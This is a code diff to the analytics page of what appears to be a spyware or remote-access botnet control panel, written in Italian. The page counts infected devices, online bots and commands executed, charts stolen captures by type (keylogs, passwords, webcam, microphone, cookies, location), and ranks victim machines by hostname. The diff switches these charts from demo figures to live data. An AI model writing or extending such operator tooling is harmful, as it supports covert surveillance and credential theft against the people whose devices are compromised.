@@ -98,14 +98,20 @@
         }
         .stat-box .number { font-size: 2rem; font-weight: 700; }
         .stat-box .label { font-size: 0.65rem; color: rgba(255,255,255,0.2); text-transform: uppercase; margin-top: 0.2rem; }
-        .stat-box .trend { font-size: 0.7rem; margin-top: 0.2rem; }
-        .stat-box .trend.up { color: #34d399; }
-        .stat-box .trend.down { color: #f87171; }
 
         .chart-row {
             display: grid; grid-template-columns: 2fr 1fr; gap: 1.2rem;
         }
         .chart-card canvas { max-height: 220px; max-width: 100%; }
+
+        .top-devices-list { list-style: none; padding: 0; }
+        .top-devices-list li {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0.5rem 0; border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+        .top-devices-list li .rank { color: rgba(255,255,255,0.2); font-size: 0.7rem; margin-right: 0.5rem; }
+        .top-devices-list li .name { font-weight: 500; }
+        .top-devices-list li .stats { font-size: 0.7rem; color: rgba(255,255,255,0.2); }
 
         ::-webkit-scrollbar { width: 4px; height: 4px; }
         ::-webkit-scrollbar-track { background: transparent; }
@@ -146,52 +152,46 @@
         <div class="topbar">
             <div style="display:flex;align-items:center;gap:0.8rem;">
                 <button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
-                <h1>Analytics <span>| Statistiche e metriche</span></h1>
+                <h1>Analytics <span>| Statistiche reali</span></h1>
             </div>
             <div class="actions">
                 <button class="btn-ghost" onclick="refreshAnalytics()"><i class="fas fa-sync"></i> Aggiorna</button>
             </div>
         </div>
 
-        <!-- Statistiche rapide -->
+        <!-- Statistiche reali -->
         <div class="stats-grid" id="statsGrid">
             <div class="stat-box">
                 <div class="number" style="color:#8b5cf6;" id="totalDevices">0</div>
                 <div class="label">Dispositivi totali</div>
-                <div class="trend up">▲ +0%</div>
             </div>
             <div class="stat-box">
                 <div class="number" style="color:#34d399;" id="onlineDevices">0</div>
                 <div class="label">Online</div>
-                <div class="trend up" id="onlinePercent">▲ 0%</div>
             </div>
             <div class="stat-box">
                 <div class="number" style="color:#f472b6;" id="totalCaptures">0</div>
                 <div class="label">Catture totali</div>
-                <div class="trend up">▲ +0%</div>
             </div>
             <div class="stat-box">
                 <div class="number" style="color:#fbbf24;" id="totalCommands">0</div>
                 <div class="label">Comandi eseguiti</div>
-                <div class="trend up">▲ +0%</div>
             </div>
             <div class="stat-box">
                 <div class="number" style="color:#60a5fa;" id="activeBots">0</div>
                 <div class="label">Bot attivi (oggi)</div>
-                <div class="trend up">▲ +0%</div>
             </div>
             <div class="stat-box">
                 <div class="number" style="color:#f87171;" id="offlineDevices">0</div>
                 <div class="label">Offline</div>
-                <div class="trend down">▼ 0%</div>
             </div>
         </div>
 
-        <!-- Grafici -->
+        <!-- Grafici reali -->
         <div class="chart-row">
             <div class="card">
                 <div class="header">
-                    <h2><i class="fas fa-chart-line"></i> Attività dispositivi (24h)</h2>
+                    <h2><i class="fas fa-chart-line"></i> Attività dispositivi (7 giorni)</h2>
                 </div>
                 <canvas id="activityChart"></canvas>
             </div>
@@ -203,12 +203,24 @@
             </div>
         </div>
 
-        <!-- Attività per tipo -->
+        <!-- Tipi di cattura reali -->
         <div class="card">
             <div class="header">
                 <h2><i class="fas fa-chart-bar"></i> Tipi di cattura</h2>
             </div>
             <canvas id="captureTypeChart" style="max-height:250px;"></canvas>
+        </div>
+
+        <!-- Top dispositivi -->
+        <div class="card">
+            <div class="header">
+                <h2><i class="fas fa-trophy"></i> Dispositivi più attivi</h2>
+            </div>
+            <ul class="top-devices-list" id="topDevicesList">
+                <li style="text-align:center;padding:1rem;color:rgba(255,255,255,0.1);">
+                    <i class="fas fa-spinner fa-spin"></i> Caricamento...
+                </li>
+            </ul>
         </div>
     </main>
 
@@ -225,6 +237,7 @@
         function refreshAnalytics() {
             refreshStats();
             refreshCharts();
+            refreshTopDevices();
         }
 
         function refreshStats() {
@@ -238,35 +251,30 @@
                     document.getElementById('offlineDevices').textContent = (data.total_devices || 0) - (data.online_devices || 0);
                     document.getElementById('deviceBadge').textContent = data.total_devices || 0;
                     document.getElementById('captureBadge').textContent = data.total_captures || 0;
-                    
-                    const onlinePercent = data.total_devices > 0 ? Math.round((data.online_devices / data.total_devices) * 100) : 0;
-                    document.getElementById('onlinePercent').textContent = `▲ ${onlinePercent}%`;
-                    document.getElementById('activeBots').textContent = Math.min(data.online_devices || 0, 50);
+                    document.getElementById('activeBots').textContent = data.online_devices || 0;
                 });
         }
 
         function refreshCharts() {
-            // Activity Chart
-            fetch('/api/chart/activity')
+            // Activity Chart - 7 giorni reali
+            fetch('/api/analytics/activity_7d')
                 .then(res => res.json())
                 .then(data => {
                     const ctx = document.getElementById('activityChart').getContext('2d');
                     if (activityChart) activityChart.destroy();
 
+                    const labels = data.map(d => d.day);
+                    const values = data.map(d => d.count);
+
                     activityChart = new Chart(ctx, {
-                        type: 'line',
+                        type: 'bar',
                         data: {
-                            labels: data.labels || [],
+                            labels: labels,
                             datasets: [{
                                 label: 'Dispositivi attivi',
-                                data: data.data || [],
-                                borderColor: '#8b5cf6',
-                                backgroundColor: 'rgba(139,92,246,0.06)',
-                                fill: true,
-                                tension: 0.4,
-                                pointRadius: 2,
-                                pointBackgroundColor: '#8b5cf6',
-                                borderWidth: 2
+                                data: values,
+                                backgroundColor: '#8b5cf6',
+                                borderRadius: 8
                             }]
                         },
                         options: {
@@ -276,14 +284,14 @@
                                 legend: { labels: { color: 'rgba(255,255,255,0.3)', font: { size: 9 } } }
                             },
                             scales: {
-                                x: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, maxTicksLimit: 12 }, grid: { color: 'rgba(255,255,255,0.02)' } },
+                                x: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 } }, grid: { color: 'rgba(255,255,255,0.02)' } },
                                 y: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, stepSize: 1 }, grid: { color: 'rgba(255,255,255,0.02)' } }
                             }
                         }
                     });
                 });
 
-            // Platform Chart
+            // Platform Chart - reali
             fetch('/api/chart/platforms')
                 .then(res => res.json())
                 .then(data => {
@@ -311,33 +319,85 @@
                     });
                 });
 
-            // Capture Type Chart (dati reali o demo)
-            const ctx3 = document.getElementById('captureTypeChart').getContext('2d');
-            if (captureTypeChart) captureTypeChart.destroy();
-            
-            captureTypeChart = new Chart(ctx3, {
-                type: 'bar',
-                data: {
-                    labels: ['Screenshot', 'Webcam', 'Microfono', 'Keylog', 'Password', 'Clipboard', 'WiFi', 'Location'],
-                    datasets: [{
-                        label: 'Catture per tipo',
-                        data: [12, 8, 5, 23, 9, 14, 4, 3],
-                        backgroundColor: ['#8b5cf6', '#22d3ee', '#f472b6', '#f59e0b', '#ef4444', '#34d399', '#60a5fa', '#f97316'],
-                        borderRadius: 8
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: true,
-                    plugins: {
-                        legend: { labels: { color: 'rgba(255,255,255,0.2)', font: { size: 8 } } }
-                    },
-                    scales: {
-                        x: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 } }, grid: { color: 'rgba(255,255,255,0.02)' } },
-                        y: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, stepSize: 1 }, grid: { color: 'rgba(255,255,255,0.02)' } }
+            // Capture Type Chart - reali
+            fetch('/api/analytics/captures_by_type')
+                .then(res => res.json())
+                .then(data => {
+                    const ctx3 = document.getElementById('captureTypeChart').getContext('2d');
+                    if (captureTypeChart) captureTypeChart.destroy();
+
+                    const colors = {
+                        'screenshot': '#8b5cf6', 'webcam': '#22d3ee', 'mic': '#f472b6',
+                        'keylog': '#f59e0b', 'passwords': '#ef4444', 'clipboard': '#34d399',
+                        'wifi': '#60a5fa', 'location': '#f97316', 'mouse': '#a855f7',
+                        'files': '#14b8a6', 'cookies': '#f43f5e'
+                    };
+
+                    const labels = data.map(d => d.type || 'unknown');
+                    const values = data.map(d => d.count);
+                    const bgColors = labels.map(l => colors[l] || '#666');
+
+                    captureTypeChart = new Chart(ctx3, {
+                        type: 'bar',
+                        data: {
+                            labels: labels,
+                            datasets: [{
+                                label: 'Catture',
+                                data: values,
+                                backgroundColor: bgColors,
+                                borderRadius: 8
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            maintainAspectRatio: true,
+                            plugins: {
+                                legend: { labels: { color: 'rgba(255,255,255,0.2)', font: { size: 8 } } }
+                            },
+                            scales: {
+                                x: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 } }, grid: { color: 'rgba(255,255,255,0.02)' } },
+                                y: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, stepSize: 1 }, grid: { color: 'rgba(255,255,255,0.02)' } }
+                            }
+                        }
+                    });
+                });
+        }
+
+        function refreshTopDevices() {
+            fetch('/api/analytics/top_devices')
+                .then(res => res.json())
+                .then(data => {
+                    const list = document.getElementById('topDevicesList');
+                    if (!data || data.length === 0) {
+                        list.innerHTML = `<li style="text-align:center;padding:1rem;color:rgba(255,255,255,0.1);">
+                            <i class="fas fa-inbox"></i> Nessun dispositivo attivo
+                        </li>`;
+                        return;
                     }
-                }
-            });
+
+                    let html = '';
+                    data.forEach((d, i) => {
+                        const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `#${i+1}`;
+                        html += `
+                        <li>
+                            <div class="info">
+                                <span class="rank">${medal}</span>
+                                <span class="name">${d.hostname || d.device_id.substring(0,12)}</span>
+                                <span style="font-size:0.6rem;color:rgba(255,255,255,0.1);">${d.platform || 'unknown'}</span>
+                            </div>
+                            <div class="stats">
+                                ${d.commands_count || 0} comandi · ${d.captures_count || 0} catture
+                            </div>
+                        </li>`;
+                    });
+                    list.innerHTML = html;
+                })
+                .catch(() => {
+                    document.getElementById('topDevicesList').innerHTML = `
+                        <li style="text-align:center;padding:1rem;color:rgba(255,255,255,0.1);">
+                            <i class="fas fa-exclamation-triangle"></i> Errore caricamento
+                        </li>`;
+                });
         }
 
         function updateTime() {
